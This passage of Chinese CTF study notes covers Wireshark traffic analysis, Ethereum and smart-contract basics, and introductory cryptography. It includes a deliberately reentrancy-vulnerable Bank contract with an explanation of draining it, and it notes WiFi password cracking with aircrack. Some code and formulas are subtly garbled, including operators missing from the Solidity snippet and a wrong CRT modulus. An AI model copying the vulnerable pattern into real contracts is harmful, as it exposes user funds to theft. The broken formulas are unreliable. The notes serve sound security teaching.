<li>具体分析某些请求：利用过滤器</li>
<li>分析某一数据包具体内容<ul>
<li>跟踪流，跟踪 TCP 解析 TCP，跟踪 HTTP 可以自动解压 gzip 等</li>
<li>分析请求头、响应头、请求体、响应体等</li>
</ul>
</li>
</ul>
<p><strong>UDP 协议</strong></p>
<ul>
<li>
<p>UDP 协议是无连接的，不需要像 TCP 一样三次握手</p>
</li>
<li>
<p>和 TCP/HTTP 一样直接追踪分析就可以</p>
</li>
<li>常见的基于 UDP 的协议：DNS</li>
<li>
<p>具体题目示例</p>
<ul>
<li>
<p>本次 lab 中的题目：dnscap</p>
</li>
<li>
<p>MRCTF 2022：Bleach!</p>
</li>
<li>基于 UDP 的 RTP 协议，需要手动选择进行解析</li>
<li>RTP 是一种音视频传输协议，可以得到音频流</li>
<li>wav 音频流中 LSB 包含隐写图片</li>
</ul>
</li>
</ul>
<p><strong>其他协议</strong></p>
<ul>
<li>ICMP 协议：ping<ul>
<li>某时也会带有一些信息，可以进行进一步分析</li>
</ul>
</li>
<li>
<p>OICQ 协议：QQ 使用，是加密的，但是可以看到双方 QQ 号等</p>
</li>
<li>
<p>WIFI 协议（IEEE 802.11）</p>
<ul>
<li>可以使用 Linux aircrack 套件爆破密码      </li>
<li>有了密码后可以在 Wireshark 中设置并解密流量</li>
</ul>
</li>
<li>USB 协议<ul>
<li>安装了 USBcap 之后可以在 Wireshark 中捕获 USB 流量</li>
<li>有工具可以解析流量，绘制鼠标轨迹，得到按键信息等</li>
</ul>
</li>
<li>其他加密协议<ul>
<li>VMess，需要读文档 / 源码，实现解密</li>
</ul>
</li>
</ul>
<h3 id="note-ctf-misc-part2_1">Part2:以太坊区块链基础<a class="headerlink" href="#note-ctf-misc-part2_1" title="Permanent link">&para;</a></h3>
<h4 id="note-ctf-misc-_21">以太坊模型全览<a class="headerlink" href="#note-ctf-misc-_21" title="Permanent link">&para;</a></h4>
<p><strong>区块与世界状态</strong></p>
<p><img alt="alt text" src="../NOTE/CTF/image.png" />
- 每个区块包含三颗 Merkle 树根节点
   - stateRoot 即世界状态树根节点，状态是一组用户状态的组合
- 区块由“矿工”或“验证者”将交易打包形成，后广播到网络中
   - 每条交易会引发世界状态的转变，消耗一定 gas</p>
<p><strong>交易与世界状态转变</strong></p>
<p><img alt="alt text" src="../NOTE/CTF/image-1.png" />
- 每一条交易都会引起状态的改变
- 多个交易打包到一起，最终状态就是新区块存储的状态
- 交易信息中包含 hash/v/r/s 为交易签名，用于验证交易的合法性
- 合约在 EVM 上执行，执行过程中也有各种漏洞</p>
<h4 id="note-ctf-misc-_22">账户与交易<a class="headerlink" href="#note-ctf-misc-_22" title="Permanent link">&para;</a></h4>
<p><strong>账户</strong></p>
<ul>
<li>外部账户（Externally Owned Account）</li>
<li>有一对公私钥，用于签署交易<ul>
<li>私钥是随机生成的 256 位数（32 字节）</li>
<li>公钥由私钥经过 ECDSA 算法计算而来，是一个 64 字节的数</li>
<li>地址由公钥经过 Keccak-256 哈希后取前 20 字节得到</li>
</ul>
</li>
</ul>
<p><img alt="alt text" src="../NOTE/CTF/image-2.png" /></p>
<ul>
<li>合约账户（Contract Account）</li>
<li>由 EOA 通过交易创建的账户，其中包含合约代码</li>
<li>合约可以存储、拥有以太币</li>
<li>向合约账户发送交易 &gt; 调用合约中的函数</li>
<li>合约本身不能主动发起交易，但可以在被调用时向外发送交易  </li>
</ul>
<p><strong>交易</strong></p>
<ul>
<li>一条交易包含以下内容：    <ul>
<li>from：交易发送者地址 </li>
<li>to：交易接收者地址，如果为空则表示是在创建智能合约</li>
<li>value：交易金额，即发送方要给接收方转移的以太币数量（wei 为单位）</li>
<li>data：交易数据，如果是创建智能合约则是智能合约代码，如果是调用智能
合约则是调用的函数名和参数</li>
<li>gasPrice：交易的 gas 价格，即每单位 gas 的价格（wei 为单位）</li>
<li>gasLimit：交易的 gas 上限，即交易允许执行的最大 gas 数量</li>
<li>nonce：交易的序号，即发送者已经发送的交易数量</li>
</ul>
</li>
<li>
<p>除此之外发送的交易数据包还需要包含：</p>
<ul>
<li>
<p>hash：交易的哈希值，由前面的内容和 chainId 计算得到</p>
</li>
<li>
<p>v、r、s：交易签名的三个部分，由发送者私钥对交易哈希值进行签名得到
<a href="https:/converter.murkin.me/">以太币单位</a></p>
</li>
</ul>
</li>
</ul>
<p><strong>关于链与 faucet</strong></p>
<ul>
<li>
<p>公开链：真实的交易</p>
<ul>
<li>
<p>通过 https: /etherscan.io/ 查看</p>
</li>
<li>
<p>主网（mainnet）：真正的金钱交易，很少使用</p>
</li>
<li>
<p>测试链：Sepolia / Holesky 链，可以通过 faucet 获取免费代币</p>
<ul>
<li>
<p>https: /sepolia-faucet.pk910.de/</p>
</li>
<li>
<p>Ethernaut 等大型公开合约 CTF 平台会使用</p>
</li>
<li>私链：自己搭建的链，模拟真实的链<ul>
<li>一般 CTF 题目都使用私链部署</li>
<li>可以通过 geth 等工具部署私链</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="note-ctf-misc-_23">智能合约安全基础<a class="headerlink" href="#note-ctf-misc-_23" title="Permanent link">&para;</a></h3>
<p><strong>关于合约</strong></p>
<ul>
<li>
<p>合约的创建和调用都通过交易来进行</p>
</li>
<li>
<p>合约调用：</p>
<ul>
<li>
<p>data 字段为编码后的函数名（selector）和参数，称为 calldata</p>
</li>
<li>
<p>selector 是函数签名 keccak256 的前四个字节</p>
</li>
<li>
<p>不存在对应 selector 则会调用 fallback 函数，还不存在则 revert</p>
</li>
<li>合约存储：全公开存储，都在链上，可以 getStorageAt 查看</li>
</ul>
</li>
<li>
<p>revert：回滚，所有当前调用中的状态改变全都复原</p>
</li>
<li>
<p>合约编译后得到字节码在 EVM 上运行：</p>
<ul>
<li>https:/ethervm.io/</li>
</ul>
</li>
</ul>
<p><strong>Solidity 语言</strong></p>
<p><a href="https://note.tonycrane.cc/ctf/blockchain/eth/solidity/">https://note.tonycrane.cc/ctf/blockchain/eth/solidity/</a>
 官方文档：<a href="https://docs.soliditylang.org/en/latest/index.html">https://docs.soliditylang.org/en/latest/index.html</a></p>
<ul>
<li>以太坊官方的编写智能合约的语言<ul>
<li>IDE：https: /remix.ethereum.org/</li>
<li>通过 contract 关键字声明一个合约</li>
<li>通过 function 定义一个可以调用的函数</li>
<li>public、internal、external、private</li>
<li>属性（状态）会自动创建 getter 函数</li>
<li>通过 view、pure 关键字定义一个不改变状态的函数</li>
<li>通过 payable 关键字定义一个可以接收以太币的函数</li>
<li>特殊函数：constructor、fallback、receive</li>
</ul>
</li>
</ul>
<h4 id="note-ctf-misc-_24">常见漏洞<a class="headerlink" href="#note-ctf-misc-_24" title="Permanent link">&para;</a></h4>
<ul>
<li>重入攻击</li>
</ul>
<div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-ctf-misc-__codelineno-0-1"></a><span class="n">contract</span> <span class="n">Bank</span> <span class="p">{</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-ctf-misc-__codelineno-0-2"></a><span class="n">mapping</span><span class="p">(</span><span class="n">address</span> <span class="o">&gt;</span> <span class="n">uint256</span><span class="p">)</span> <span class="n">balances</span><span class="p">;</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-ctf-misc-__codelineno-0-3"></a> <span class="o">.</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-ctf-misc-__codelineno-0-4"></a><span class="n">function</span> <span class="n">withdraw</span><span class="p">(</span><span class="n">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="n">public</span> <span class="p">{</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-ctf-misc-__codelineno-0-5"></a><span class="n">require</span><span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">=</span> <span class="n">amount</span><span class="p">);</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-ctf-misc-__codelineno-0-6"></a> <span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="o">.</span><span class="n">call</span><span class="o">.</span><span class="n">value</span><span class="p">(</span><span class="n">amount</span><span class="p">)(</span><span class="s2">&quot;&quot;</span><span class="p">);</span>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#note-ctf-misc-__codelineno-0-7"></a> <span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="o">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="n">amount</span><span class="p">;</span>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#note-ctf-misc-__codelineno-0-8"></a> <span class="p">}</span>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#note-ctf-misc-__codelineno-0-9"></a><span class="p">}</span>
</span></code></pre></div>
<p><code>withdraw</code> 时先转钱再更新 balances,转钱的时候会进入到目标合约的 <code>fallback</code> 函数，可以再次调用 <code>withdraw</code>,再次调用时<code>require</code>检查的仍然是老的 <code>balances</code>,这样可以把钱取空</p>
<ul>
<li>伪随机数</li>
<li>区块链需要所有以太坊节点验证交易计算出相同结果达成共识</li>
<li>无法实现真随机数</li>
<li>伪随机可以破解：<ul>
<li>利用区块变量作为随机数：可以获取</li>
<li>利用 blockhash 作为随机数：只保留最近 256 个区块</li>
<li>回滚攻击：不断 revert 来猜随机数
<a href="https: /note.tonycrane.cc/ctf/blockchain/eth/vuln/">其他常见漏洞</a></li>
</ul>
</li>
</ul>
<h3 id="note-ctf-misc-ctf">CTF 比赛中的私链题目交互<a class="headerlink" href="#note-ctf-misc-ctf" title="Permanent link">&para;</a></h3>
<p>一般会过滤掉大部分 geth rpc 接口,防止其他队伍扒链蹭车 / 重放</p>
<ul>
<li>白名单示例可见 <a href="https://github.com/chainflag/solidctf/blob/main/fogeth/proxy/eth-jsonrpc-access.js">chainflag</a>/<a href="https://github.com/chainflag/solidctf/blob/main/fogeth/proxy/eth-jsonrpc-access.js">solidctf</a>中的白名单，一般就是这些</li>
<li>
<p>geth 手动操作很复杂（只能发 raw），remix/metamask 可能会无法连接</p>
<ul>
<li>
<p>可以 / 推荐通过 web3.py 进行交互</p>
</li>
<li>
<p>通过 eth.contract 和 abi 与 addr/bytecode 创建合约对象</p>
</li>
<li>
<p>通过 contract.functions.f().build_transaction() 构建交易</p>
</li>
<li>
<p>通过 eth.account.sign_transaction(txn, privateKey) 签名</p>
</li>
<li>
<p>得到 rawTransaction 后 eth.send_raw_transaction(raw) 发送</p>
</li>
<li>
<p>通过 eth.wait_for_transaction_receipt(hash) 等待交易完成</p>
</li>
<li>
<p>无需交易的 view 函数可以直接 contract.functions.f().call()</p>
</li>
<li>
<p>https:/note.tonycrane.cc/ctf/blockchain/eth/basic/ _15</p>
</li>
</ul>
</li>
</ul>
<p><strong>more</strong></p>
<p>Read more: note.tonycrane.cc/ctf/blockchain/eth
- 以太坊基础知识：账户、交易、合约、区块等，及其原理</p>
<ul>
<li>
<p>Solidity 语言：最常用的智能合约语言，以太坊官方语言</p>
</li>
<li>
<p>了解其语法、类型，以及合约运行的整体逻辑</p>
</li>
<li>
<p>了解一些 ERC 标准（目的是看懂题目的合约）</p>
</li>
<li>
<p>以太坊虚拟机（EVM）：执行合约字节码的栈结构虚拟机</p>
</li>
<li>
<p>了解其运行原理，与账户、合约、交易的关系，反汇编、反编译的方法</p>
</li>
<li>
<p>交互、测试环境：geth、Remix、MetaMask、web3.js、web3.py 等</p>
</li>
<li>常见合约漏洞：整型溢出、重入、伪随机、薅羊毛、非预期的远程调用……</li>
</ul></section><section class="print-page" id="note-ctf-crypto" heading-number="2.5.1.4"><h1 id="note-ctf-crypto-crypto">Crypto<a class="headerlink" href="#note-ctf-crypto-crypto" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 1412 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 2 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 5 分钟</p>
</div>
<blockquote>
<p>授课：城堡</p>
</blockquote>
<h2 id="note-ctf-crypto-_1">密码学基础<a class="headerlink" href="#note-ctf-crypto-_1" title="Permanent link">&para;</a></h2>
<p>密码学是研究编制密码和破译密码的技术科学</p>
<ul>
<li>设计加解密算法</li>
<li>破解加解密算法</li>
</ul>
<h2 id="note-ctf-crypto-_2">密码学介绍<a class="headerlink" href="#note-ctf-crypto-_2" title="Permanent link">&para;</a></h2>
<h3 id="note-ctf-crypto-_3">为何需要密码学<a class="headerlink" href="#note-ctf-crypto-_3" title="Permanent link">&para;</a></h3>
<ul>
<li>存储：信息的存储可能是不安全的，会被窃取</li>
<li>传输：信息的传输过程可能也不是隐秘的，会被窃听</li>
</ul>
<p>不能直接使用明文进行存储和传输！</p>
<h3 id="note-ctf-crypto-crypto-in-ctf">Crypto in CTF<a class="headerlink" href="#note-ctf-crypto-crypto-in-ctf" title="Permanent link">&para;</a></h3>
<p>出题人给定一个有一定缺陷的加密算法，需要选手攻破该加密算法，得到解密后的文字，或者伪造加密信息</p>
<p>比赛中题目虽然常常会涉及许多较新的论文研究结果，但是仍与目前隐私计算等前沿密码学安全研究有一定距离</p>
<h3 id="note-ctf-crypto-crypto_1">Crypto学习资源推荐<a class="headerlink" href="#note-ctf-crypto-crypto_1" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://ctf-wiki.org/">CTF Wiki</a></li>
<li>4老师倾情推荐的密码学做题网站：<a href="https://cryptohack.org/">CryptoHack</a></li>
<li>密码学入门书籍：<a href="https://link.springer.com/book/10.1007/978-1-4939-1711-2">An introduction to mathematical cryptography</a></li>
</ul>
<h2 id="note-ctf-crypto-_4">基本术语<a class="headerlink" href="#note-ctf-crypto-_4" title="Permanent link">&para;</a></h2>
<ul>
<li>消息被称为明文（Plaintext）。用某种方法伪装消息以隐藏它的内容的过程称为加密 （Encryption），被加密的消息称为密文（Ciphertext），把密文恢复为明文的过程称为密（Decryption）。</li>
<li>密码算法（Cryptography Algorithm）：是用于加密和解密的数学函数。</li>
<li>密钥（Key）：加密或解密所需要的除密码算法之外的关键信息。</li>
<li>对称加密（Symmetric Cryptography）<ul>
<li>特点：在加密和解密时使用同一密钥</li>
<li>例子：流密码（RC4），块密码（AES，DES）</li>
</ul>
</li>
<li>非对称加密（Asymmetric Cryptography）<ul>
<li>特点：在加密和解密时使用不同密钥，加密使用公钥，解密使用私钥</li>
<li>例子：RSA，ElGamal，ECC</li>
</ul>
</li>
<li>哈希函数（Hash Function）<ul>
<li>特点：把输入内容单向映射到一个短的摘要上</li>
<li>应用：下载文件完整性校验</li>
<li>例子：CRC，MD5，SHA系列</li>
</ul>
</li>
<li>数字签名（Digital Signature）<ul>
<li>应用：对消息进行签名（也是一个短的消息），以防消息的冒名伪造或篡改</li>
</ul>
</li>
</ul>
<p><img alt="密码学基本术语" src="../NOTE/CTF/img/mm1.png" /></p>
<h2 id="note-ctf-crypto-_5">数学基础<a class="headerlink" href="#note-ctf-crypto-_5" title="Permanent link">&para;</a></h2>
<h3 id="note-ctf-crypto-oi-wiki"><a href="https://oi-wiki.org/math/number-theory/basic/">OI Wiki 数论部分</a><a class="headerlink" href="#note-ctf-crypto-oi-wiki" title="Permanent link">&para;</a></h3>
<h3 id="note-ctf-crypto-a-mid-b">整除：$ a \mid b $<a class="headerlink" href="#note-ctf-crypto-a-mid-b" title="Permanent link">&para;</a></h3>
<ul>
<li><span class="arithmatex">\(\forall a \in \mathbb{Z}~, 1 \mid a\)</span> ；若 <span class="arithmatex">\(a \neq 0\)</span>，则 <span class="arithmatex">\(a \mid 0\)</span> 且 <span class="arithmatex">\(a \mid a\)</span></li>
<li>若 <span class="arithmatex">\(a \mid b\)</span> 且 <span class="arithmatex">\(b \mid c\)</span>，则 <span class="arithmatex">\(a \mid c\)</span></li>
<li>若 <span class="arithmatex">\(a \mid b\)</span> 且 <span class="arithmatex">\(a \mid c\)</span>，则 <span class="arithmatex">\(a \mid (sb + tc)\)</span>，其中 <span class="arithmatex">\(s, t \in \mathbb{Z}\)</span></li>
</ul>
<h3 id="note-ctf-crypto-greatest-common-divisor-gcd-gcda-b">最大公因数（Greatest Common Divisor, GCD）：$ \gcd(a, b) $<a class="headerlink" href="#note-ctf-crypto-greatest-common-divisor-gcd-gcda-b" title="Permanent link">&para;</a></h3>
<ul>
<li><span class="arithmatex">\(\gcd(a, b) = \gcd(b, a)\)</span></li>
<li><span class="arithmatex">\(\gcd(a, b) = \gcd(a, b - a)\)</span></li>
<li><span class="arithmatex">\(\gcd(a, b) = \gcd(a, b \mod a)\)</span></li>
</ul>
<p>特别的，当 <span class="arithmatex">\(a\)</span>、<span class="arithmatex">\(b\)</span>互素，即 $ \gcd(a, b) = 1 $时，一定存在整数 <span class="arithmatex">\(x, y\)</span> 使得 <span class="arithmatex">\(ax + by = 1\)</span></p>
<h3 id="note-ctf-crypto-_6">算数基本定理<a class="headerlink" href="#note-ctf-crypto-_6" title="Permanent link">&para;</a></h3>
<p>任何一个大于 <span class="arithmatex">\(1\)</span> 的自然数 <span class="arithmatex">\(n\)</span> 都可以唯一地分解为若干个素数的乘积
$$ n = p_1^{a_1} \times p_2^{a_2} \cdots  \times p_k^{a_k} $$
其中 <span class="arithmatex">\(p_1, p_2, \cdots, p_k\)</span> 是素数，<span class="arithmatex">\(a_1, a_2, \cdots, a_k\)</span> 是正整数</p>
<h3 id="note-ctf-crypto-_7">同余<a class="headerlink" href="#note-ctf-crypto-_7" title="Permanent link">&para;</a></h3>
<p><span class="arithmatex">\(a,b\)</span>对于模<span class="arithmatex">\(n\)</span>同余：<span class="arithmatex">\(a \equiv b \pmod{n}\)</span></p>
<p>设 <span class="arithmatex">\(a, b, c, d, n\)</span>均为整数，且 <span class="arithmatex">\(n \neq 0\)</span>，则有：</p>
<ul>
<li>$ n \mid a \Leftrightarrow a \equiv b \pmod{n} $</li>
<li>$ a \equiv a \pmod{n} $</li>
<li>若 <span class="arithmatex">\(a \equiv b \pmod{n}\)</span>，<span class="arithmatex">\(c \equiv d \pmod{n}\)</span>，则 <span class="arithmatex">\(a \pm c \equiv b \pm d \pmod{n}\)</span>，<span class="arithmatex">\(ac \equiv bd \pmod{n}\)</span></li>
<li>若 <span class="arithmatex">\(a \equiv b \pmod{n}\)</span>，则 <span class="arithmatex">\(a^k \equiv b^k \pmod{n}\)</span></li>
<li>若 <span class="arithmatex">\(a \equiv b \pmod{n}\)</span>，<span class="arithmatex">\(c \equiv d \pmod{n}\)</span>，则 <span class="arithmatex">\(a^c \equiv b^d \pmod{n}\)</span></li>
<li>若 <span class="arithmatex">\(a + b \equiv 0 \pmod{n}\)</span>，则称 <span class="arithmatex">\(a\)</span> 与 <span class="arithmatex">\(b\)</span> 互为加法模 <span class="arithmatex">\(n\)</span> 逆元</li>
<li>若 <span class="arithmatex">\(ab \equiv 1 \pmod{n}\)</span>，则称 <span class="arithmatex">\(a\)</span> 与 <span class="arithmatex">\(b\)</span> 互为乘法模 <span class="arithmatex">\(n\)</span> 逆元。<span class="arithmatex">\(a\)</span> 的乘法模 <span class="arithmatex">\(n\)</span> 逆元记为 <span class="arithmatex">\(a^{-1}\)</span> ，<span class="arithmatex">\(a\)</span> 有乘法模 <span class="arithmatex">\(n\)</span> 逆元当且仅当 <span class="arithmatex">\(\gcd(a, n) = 1\)</span></li>
</ul>
<h3 id="note-ctf-crypto-_8">中国剩余定理<a class="headerlink" href="#note-ctf-crypto-_8" title="Permanent link">&para;</a></h3>
<p>若 <span class="arithmatex">\(m_1, m_2, \cdots, m_k\)</span> 是两两互质的正整数，则对于任意的整数 <span class="arithmatex">\(a_1, a_2, \cdots, a_k\)</span>，同余方程组
\[
\begin{cases}
    x \equiv a_1 \pmod{m_1} \\
    x \equiv a_2 \pmod{m_2} \\
    \cdots \\
    x \equiv a_k \pmod{m_k}
\end{cases}
\]
对模 <span class="arithmatex">\(m = m_{1}m_{1} \cdots m_{1}\)</span> 有唯一解 <span class="arithmatex">\(x\)</span>。</p>
<p>设 <span class="arithmatex">\(M_i = \frac{m}{m_i}\)</span>，则 <span class="arithmatex">\(M_i\)</span> 与 <span class="arithmatex">\(m_i\)</span> 互质，存在整数 <span class="arithmatex">\(N_i\)</span> 使得 <span class="arithmatex">\(M_iN_i \equiv 1 \pmod{m_i}\)</span>（<span class="arithmatex">\(N_i\)</span> 为 <span class="arithmatex">\(M_i\)</span> 的模 <span class="arithmatex">\(m_i\)</span> 乘法逆元），则
$$ x = \sum_{i=1}^{k} a_iM_iN_i $$</p>
<h3 id="note-ctf-crypto-_9">欧拉函数<a class="headerlink" href="#note-ctf-crypto-_9" title="Permanent link">&para;</a></h3>
<p>对于正整数 <span class="arithmatex">\(n\)</span>，欧拉函数 <span class="arithmatex">\(\varphi(n)\)</span> 定义为小于等于 <span class="arithmatex">\(n\)</span> 的正整数中与 <span class="arithmatex">\(n\)</span> 互质的数的个数</p>
<ul>
<li>若 <span class="arithmatex">\(n = p_1^{a_1} \times p_2^{a_2} \cdots  \times p_k^{a_k}\)</span>，则 <span class="arithmatex">\(\varphi(n) = n \times (1 - \frac{1}{p_1}) \times (1 - \frac{1}{p_2}) \cdots (1 - \frac{1}{p_k})\)</span></li>
<li>若 <span class="arithmatex">\(n = p^a\)</span>，则 <span class="arithmatex">\(\varphi(n) = p^a - p^{a-1} = p^{a-1}(p-1)\)</span></li>
<li>若 <span class="arithmatex">\(n = p \times q\)</span>，且 <span class="arithmatex">\(p, q\)</span> 互质，则 <span class="arithmatex">\(\varphi(n) = \varphi(p) \times \varphi(q)\)</span></li>
<li>若 <span class="arithmatex">\(n = p \times q\)</span>，且 <span class="arithmatex">\(p, q\)</span> 为不同的质数，则 <span class="arithmatex">\(\varphi(n) = (p-1)(q-1) = \varphi(p) \times \varphi(q)\)</span></li>
</ul>
<h3 id="note-ctf-crypto-_10">欧拉定理<a class="headerlink" href="#note-ctf-crypto-_10" title="Permanent link">&para;</a></h3>
<p>若 <span class="arithmatex">\(a, n\)</span> 互质，则 <span class="arithmatex">\(a^{\varphi(n)} \equiv 1 \pmod{n}\)</span></p>
<p>费马小定理（欧拉定理的特例）：当 <span class="arithmatex">\(n\)</span> 为质数时，<span class="arithmatex">\(\varphi(n) = n - 1\)</span>，即 <span class="arithmatex">\(a^{n-1} \equiv 1 \pmod{n}\)</span></p>
<h3 id="note-ctf-crypto-rsa">RSA算法<a class="headerlink" href="#note-ctf-crypto-rsa" title="Permanent link">&para;</a></h3>
<ul>
<li>选择两个大质数 <span class="arithmatex">\(p, q\)</span>，计算 <span class="arithmatex">\(n = p \times q\)</span>，<span class="arithmatex">\(\varphi(n) = (p-1)(q-1)\)</span></li>
<li>选择 <span class="arithmatex">\(e\)</span>，使得 <span class="arithmatex">\(1 &lt; e &lt; \varphi(n)\)</span>，且 <span class="arithmatex">\(\gcd(e, \varphi(n)) = 1\)</span></li>
<li>计算 <span class="arithmatex">\(d\)</span>，使得 <span class="arithmatex">\(d \equiv e^{-1} \pmod{\varphi(n)}\)</span> ，即 <span class="arithmatex">\(d \times e \equiv 1 \pmod{\varphi(n)}\)</span></li>
<li>于是得到公钥为 <span class="arithmatex">\((e, n)\)</span>，私钥为 <span class="arithmatex">\((d, n)\)</span>， 设明文为 <span class="arithmatex">\(m\)</span>，密文为 <span class="arithmatex">\(c\)</span>，若消息太长，可将消息分段加密<ul>
<li>加密：<span class="arithmatex">\(c = m^e \mod n\)</span></li>
<li>解密：<span class="arithmatex">\(m = c^d \mod n\)</span></li>
</ul>
</li>
</ul>
<h2 id="note-ctf-crypto-_11">古典密码<a class="headerlink" href="#note-ctf-crypto-_11" title="Permanent link">&para;</a></h2>
<ul>
<li>代换（substitution）密码——用新的替换原先的内容</li>
<li>置换（permutation）密码——打乱原先的顺序</li>
<li>Hill密码</li>
</ul>
<h3 id="note-ctf-crypto-_12">凯撒密码<a class="headerlink" href="#note-ctf-crypto-_12" title="Permanent link">&para;</a></h3>
<p>又称加法密码，是一种最简单的替换密码，是一种使用恒定偏移量的替换密码，将字母表中的每个字母循环移动固定位数得到密文</p>
<ul>
<li>加密：<span class="arithmatex">\(y = \text{encode}(x) = (x + key) \mod 26\)</span></li>
<li>解密：<span class="arithmatex">\(x = \text{decode}(y) = (y - key) \mod 26\)</span></li>
<li>破解：暴力枚举观察结果（常见编码ROT13，取<span class="arithmatex">\(key = 13\)</span>）</li>
</ul>
<p>一般的凯撒加密只作用于26个字母，但也可拓展到ASCII码表上（常见编码ROT47，将33~126作为字母表，取<span class="arithmatex">\(key = 47\)</span>）</p>
<h3 id="note-ctf-crypto-_13">仿射密码<a class="headerlink" href="#note-ctf-crypto-_13" title="Permanent link">&para;</a></h3>
<p>仿射密码是一种线性替换密码，类似于凯撒加密，但不止进行加法</p>
<ul>
<li>加密 <span class="arithmatex">\(y = \text{encoude}(x) = (x \times key_1 + key_2) \mod 26\)</span></li>
<li>解密 <span class="arithmatex">\(x = \text{decode}(y) = (y - key_2) \times key_1^{-1}  \mod 26\)</span></li>
<li>破解：单表密码加密前后的字符是一一对应的，不会破坏统计规律，根据英文文本中字母出现的频率以及一些常见单词即可轻松破解(如<code>the</code>, <code>and</code>, <code>you</code> <code>a</code>等)</li>
</ul>
<h3 id="note-ctf-crypto-_14">维吉尼亚密码<a class="headerlink" href="#note-ctf-crypto-_14" title="Permanent link">&para;</a></h3>
<p>一种多表加密的替换密码，密钥任意长，并且以循环使用，第 <span class="arithmatex">\(i\)</span> 个字符用第 <span class="arithmatex">\(i\)</span> 个密钥进行偏移</p>
<ul>
<li>加密：<span class="arithmatex">\(y_i = \text{encode}(x_i) = (x_i + key_i) \mod 26\)</span></li>
<li>解密：<span class="arithmatex">\(x_i = \text{decode}(y_i) = (y_i - key_i) \mod 26\)</span></li>
</ul>
<p><img alt="维吉尼亚密码表" src="../NOTE/CTF/img/mm2.png" /></p>
<p>例：明文CRANE，密钥TONY</p>
<ul>
<li>(C, T) <span class="arithmatex">\(\rightarrow\)</span> V</li>
<li>(R, O) <span class="arithmatex">\(\rightarrow\)</span> F</li>
<li>(A, N) <span class="arithmatex">\(\rightarrow\)</span> N</li>
<li>(N, Y) <span class="arithmatex">\(\rightarrow\)</span> L</li>
<li>(E, T) <span class="arithmatex">\(\rightarrow\)</span> X</li>
</ul>
<p>破解：确定密钥长度 <span class="arithmatex">\(\rightarrow\)</span> 分组爆破加法密码 <span class="arithmatex">\(\rightarrow\)</span> 得到密钥</p>
<h3 id="note-ctf-crypto-_15">置换密码<a class="headerlink" href="#note-ctf-crypto-_15" title="Permanent link">&para;</a></h3>
<p>加密变换使得信息元素只有位置变化而内容不变，比如对于一种置换密码，其置换表为</p>
<table>
<thead>
<tr>
<th>X</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
</tr>
</thead>
<tbody>
<tr>
<td>E(X)</td>
<td>3</td>
<td>5</td>
<td>1</td>
<td>6</td>
<td>4</td>
<td>2</td>
</tr>
</tbody>
</table>
<p>对于明文<span class="arithmatex">\(\texttt{crypto basic}\)</span>，先进行分组（不足需填充）：<span class="arithmatex">\(\texttt{[crypto]}\)</span>和<span class="arithmatex">\(\texttt{[ basic]}\)</span>，然后对每一组进行置换：
对每一组进行置换：
<span class="arithmatex">\(\texttt{[crypto]} \rightarrow \texttt{[yoctrp]}\)</span>  <span class="arithmatex">\(\texttt{[ basic]} \rightarrow \texttt{[ac ibs]}\)</span>
最终密文就是<span class="arithmatex">\(\texttt{yoctrpac ibs}\)</span></p>
<h3 id="note-ctf-crypto-_16">栅栏密码<a class="headerlink" href="#note-ctf-crypto-_16" title="Permanent link">&para;</a></h3>
<p>栅栏密码也是一种置换密码，其将明文分割成k行，然后重新拼接，这里k即为加密的密钥</p>
<p>对于明文<span class="arithmatex">\(\texttt{crypto basic}\)</span>,取 <span class="arithmatex">\(k=3\)</span> ，将明文分割成三行</p>
<table>
<thead>
<tr>
<th><div style="font-weight:normal">c</div></th>
<th><div style="font-weight:normal">p</div></th>
<th>&#32;</th>
<th><div style="font-weight:normal">s</div></th>
</tr>
</thead>
<tbody>
<tr>
<td>r</td>
<td>t</td>
<td>b</td>
<td>i</td>
</tr>
<tr>
<td>y</td>
<td>o</td>
<td>a</td>
